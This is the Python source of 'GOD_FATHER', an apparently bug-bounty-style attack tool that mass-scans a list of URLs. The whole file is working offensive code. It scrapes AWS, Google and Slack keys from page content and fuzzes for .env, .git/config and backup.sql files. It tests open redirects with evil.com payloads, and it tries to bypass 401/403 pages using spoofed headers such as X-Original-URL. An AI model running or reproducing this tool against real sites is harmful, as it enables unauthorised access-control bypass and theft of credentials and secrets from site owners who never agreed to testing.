import requests
import re
import argparse
import urllib3
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, init, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(
    pool_connections=1000, 
    pool_maxsize=1500, 
    max_retries=0
)
session.mount('http://', adapter)
session.mount('https://', adapter)

stats = {"ep": 0, "ky": 0, "or": 0, "bp": 0, "sf": 0, "scanned": 0, "total": 0, "live": 0}
seen_secrets = set() 
seen_paths = set() 
processed_urls = set()

OR_PAYLOADS = ["https://www.bing.com", "//www.bing.com", "/\\/bing.com", "/%0d%0abing.com"]
BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'}, {'X-Forwarded-Host': '127.0.0.1'},
    {'X-Original-URL': '/admin'}, {'X-Rewrite-URL': '/admin'},
    {'X-Remote-IP': '127.0.0.1'}, {'X-Custom-IP-Authorization': '127.0.0.1'}
]

def print_banner():
    banner = f"""
{Fore.RED}    ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
{Fore.RED}    ██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
{Fore.RED}    ██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
{Fore.RED}    ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
{Fore.RED}    ╚██████╔╝╚██████╔╝██████╔╝██║      ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
{Fore.WHITE}    -----------------------------------------------------------------------
{Fore.YELLOW}      SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE GODFATHER.
{Fore.CYAN}                 MADE BY DHARMVEER | GOD-FATHER V16.0
    """
    print(banner)


def update_script():
    repo_url = "https://raw.githubusercontent.com/D-666-V/THE_GOD_FATHER/main/GOD_FATHER.py"
    print(f"{Fore.YELLOW}[*] Checking for updates...")
    try:
        response = requests.get(repo_url, timeout=10)
        if response.status_code == 200:
            with open(__file__, "wb") as f:
                f.write(response.content)
            print(f"{Fore.GREEN}[+] GOD_FATHER.py updated successfully!")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Update failed. Status: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[!] Update error: {e}")
    sys.exit(1)

def update_status():
    perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
    status_line = f"\r\033[K{Fore.BLUE}[{stats['scanned']}/{stats['total']}] {perc:.1f}% - {Fore.GREEN}Live:{stats['live']} {Fore.CYAN}EP:{stats['ep']} {Fore.RED}KY:{stats['ky']} {Fore.MAGENTA}OR:{stats['or']} {Fore.YELLOW}BP:{stats['bp']} {Fore.GREEN}SF:{stats['sf']}"
    sys.stdout.write(status_line)
    sys.stdout.flush()

def log_result(label, value, source_url, color=Fore.WHITE, is_vuln=False):
    if label == "CLOUD_KEY":
        output = f"{color}[{label}] {Fore.WHITE}{value} | {Fore.CYAN}{source_url}"
    elif is_vuln:
        output = f"{Fore.MAGENTA}!!! [VULNERABLE-OR] {value} !!!"
    else:
        output = f"{color}[{label}] {value}"
    
    sys.stdout.write(f"\r\033[K{output}\n")
    update_status()

def save_to_file(output_file, data_type, value, source):
    if not output_file: return
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(f"[{data_type}] {value} | {source}\n")

def test_or_poc(url, output_file):
    try:
        parsed_url = urlparse(url)
        if not parsed_url.query: return
        params = parse_qs(parsed_url.query)
        target_keys = ['url', 'redirect', 'next', 'dest', 'path', 'uri', 'to', 'out', 'domain', 'host']
        EVIL_PAYLOADS = ["https://evil.com", "//evil.com", "/\\/evil.com", "https://evil.com%0d%0a.whitelisted.com"]
        for key in params:
            if any(tk in key.lower() for tk in target_keys):
                orig_val = params[key]
                for payload in EVIL_PAYLOADS:
                    params[key] = [payload]
                    test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
                    try:
                        r = session.get(test_url, timeout=4, verify=False, allow_redirects=False)
                        loc = r.headers.get('Location', '')
                        if r.status_code in [301, 302, 303, 307, 308] and "evil.com" in loc:
                            log_result("VULN-OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
                            stats["or"] += 1
                            save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
                            params[key] = orig_val
                            return 
                    except: pass
                params[key] = orig_val
    except: pass

def try_bypass(url, output_file):
    try:
        original_r = session.get(url, timeout=4, verify=False, allow_redirects=False)
        orig_status = original_r.status_code
        orig_size = len(original_r.content)
    except: return False
    if orig_status == 200: return False
    fuzz_paths = [url, url + "/%2e/", url + "..;/"] 
    for f_path in fuzz_paths:
        for header in BYPASS_HEADERS:
            try:
                r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
                if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
                    low_content = r.text.lower()
                    bad_keywords = ["access denied", "forbidden", "unauthorized", "login", "signin"]
                    if not any(word in low_content for word in bad_keywords):
                        log_result("BP-SUCCESS", f"{f_path} (Header: {list(header.keys())[0]})", url, Fore.YELLOW + Style.BRIGHT)
                        stats["bp"] += 1
                        save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
                        return True
            except: pass
    return False

def scan_logic(content, source_url, output_file, args):
    if args.ep or args.all:
        ep_pat = r'["\'](/(?:api|v[0-9]|v3|graphql|admin|auth|config|internal|web-api|rest|hidden|debug|v4)/[a-zA-Z0-9\-_/.]+)["\']|["\'](https?://[a-zA-Z0-9.\-_/]+(?:api|v[0-9]|v3|graphql|internal|debug|v4)[a-zA-Z0-9.\-_/]*)["\']'
        for match in re.findall(ep_pat, content):
            val = match[0] if match[0] else match[1]
            val_lower = val.lower()
            media_exts = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.pdf', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.css', '.ico', '.js', '.map', '.txt', '.zip')
            junk_paths = ('/uploads/', '/assets/', '/static/', '/media/', '/images/', 'google-analytics', 'twitter.com', 'facebook.com', 'fonts.', 'cloudinary.', 'instagram.')
            if not val or any(val_lower.endswith(ext) for ext in media_exts) or any(jp in val_lower for jp in junk_paths):
                continue
            path_sig = re.sub(r'/\d+', '/{ID}', val)
            if path_sig in seen_paths: continue
            seen_paths.add(path_sig)
            gold_keys = ['admin', 'config', 'internal', 'env', 'secret', 'auth', 'setup', 'db', 'sql', 'debug', 'monitor', 'backup', 'vault', 'login', 'signin', 'logout']
            is_gold = any(gk in val_lower for gk in gold_keys)
            label = "GOLDMINE-EP" if is_gold else "ENDPOINT"
            color = Fore.CYAN + Style.BRIGHT if is_gold else Fore.CYAN
            log_result(label, val, source_url, color)
            stats["ep"] += 1
            save_to_file(output_file, label, val, source_url)
    if args.ky or args.all:
        patterns = {
            "GOOGLE_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b',
            "AWS_ACCESS_KEY": r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b',
            "SLACK_TOKEN": r'\bxox[baprs]-[0-9a-zA-Z]{10,48}\b'
        }
        for label, pat in patterns.items():
            for m in re.findall(pat, content):
                if m not in seen_secrets:
                    if len(set(m)) < 6: continue 
                    display_msg = f"{m} {Fore.WHITE}at {Fore.BLUE}{source_url}"
                    log_result(label, display_msg, source_url, Fore.RED + Style.BRIGHT)
                    seen_secrets.add(m)
                    stats["ky"] += 1
                    save_to_file(output_file, label, m, f"Found at: {source_url}")

def process_url(url, args):
    if url in processed_urls: return
    processed_urls.add(url)
    try:
        if args.sf or args.all:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            fuzz_paths = ['.env', '.git/config', 'phpinfo.php', 'config.json', 'backup.sql', 'Dockerfile']
            for sf_p in fuzz_paths:
                f_url = f"{base.rstrip('/')}/{sf_p.lstrip('/')}"
                if f_url in processed_urls: continue
                processed_urls.add(f_url)
                try:
                    sr = session.get(f_url, timeout=3, verify=False, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0'}, stream=True)
                    if sr.status_code == 200:
                        content_sample = sr.raw.read(1000).decode('utf-8', errors='ignore').lower()
                        forbidden = ["access denied", "forbidden", "unauthorized", "waf", "security challenge"]
                        not_found = ["page not found", "not found", "404", "doesn't exist", "invalid request"]
                        c_len = int(sr.headers.get('Content-Length', 0))
                        if (c_len > 500 or len(content_sample) > 500):
                            if not any(w in content_sample for w in forbidden) and not any(nf in content_sample for nf in not_found):
                                if "<html>" not in content_sample or "json" in f_url or "phpinfo" in f_url:
                                    log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
                                    stats["sf"] += 1
                                    save_to_file(args.output, "SENSITIVE-FILE", f_url, "Auto-Fuzz")
                except: pass   
        if args.poc or args.all: test_or_poc(url, args.output)
        r = session.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200:
            if args.verify: stats["live"] += 1
            if any(x in url.lower() for x in ['.env', 'config.json', 'phpinfo.php', 'backup.sql']):
                c_text = r.text.lower()
                if len(r.content) > 100 and not any(w in c_text for w in ["access denied", "forbidden"]):
                    log_result("SENS-FILE", url, url, Fore.GREEN + Style.BRIGHT)
                    stats["sf"] += 1
                    save_to_file(args.output, "SENSITIVE-FILE", url, "Direct-Hit")
            scan_logic(r.text, url, args.output, args)
        elif r.status_code in [401, 403] and (args.bp or args.all):
            try_bypass(url, args.output)
    except: pass
    stats["scanned"] += 1

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-i", "--input")
    parser.add_argument("-t", "--threads", type=int, default=150)
    parser.add_argument("-o", "--output", default=None) 
    parser.add_argument("-d", "--domain")
    parser.add_argument("-v", "--verify", action="store_true")
    parser.add_argument("-ky", action="store_true")
    parser.add_argument("-ep", action="store_true")
    parser.add_argument("-bp", action="store_true")
    parser.add_argument("-sf", action="store_true")
    parser.add_argument("-poc", action="store_true")
    parser.add_argument("-all", action="store_true")
    parser.add_argument("-up", "--update", action="store_true") 
    parser.add_argument("-h", "--help", action="store_true")

    args = parser.parse_args()

    if args.update:
        update_script()

    print_banner()

    if args.help or not args.input:
        help_menu = f"""
{Fore.RED}{Style.BRIGHT}USAGE: python3 GOD_FATHER.py -i <urls.txt> [OPTIONS]

{Fore.RED}{Style.BRIGHT}CORE ARGUMENTS:
  {Fore.WHITE}-i, --input    {Fore.YELLOW}Input file containing URLs (Required)
  {Fore.WHITE}-t, --threads  {Fore.YELLOW}Number of threads (Default: 150)
  {Fore.WHITE}-o, --output   {Fore.YELLOW}Save results to file (Optional)
  {Fore.WHITE}-d, --domain   {Fore.YELLOW}Filter by domain name

{Fore.RED}{Style.BRIGHT}MODULES:
  {Fore.WHITE}-v              {Fore.CYAN}Verify Live 200 OK Targets
  {Fore.WHITE}-ky             {Fore.CYAN}Scan for API Keys (AWS, Google, etc.)
  {Fore.WHITE}-ep             {Fore.CYAN}Extract Sensitive Endpoints & Admin Paths
  {Fore.WHITE}-bp             {Fore.CYAN}Auto-Bypass 403/401 Restricted Pages
  {Fore.WHITE}-sf             {Fore.CYAN}Fuzz for Sensitive Files (.env, .git, etc.)
  {Fore.WHITE}-poc            {Fore.CYAN}Run Open Redirect POC Tests
  {Fore.WHITE}-all            {Fore.GREEN}{Style.BRIGHT}Run All Modules (The Godfather Mode)

{Fore.RED}{Style.BRIGHT}MISC:
  {Fore.WHITE}-up, --update   {Fore.MAGENTA}Update the script to the latest version
  {Fore.WHITE}-h, --help      {Fore.YELLOW}Show this stylish help menu
        """
        print(help_menu)
        sys.exit(0)

    else:
        try:
            with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
                urls = list(set(line.strip() for line in f if line.strip()))
            
            stats["total"] = len(urls)
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = {executor.submit(process_url, url, args): url for url in urls}
                for future in as_completed(futures): update_status()
            
            print(f"\n\n{Fore.GREEN} GOD-FATHER HUNTING COMPLETE")

        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
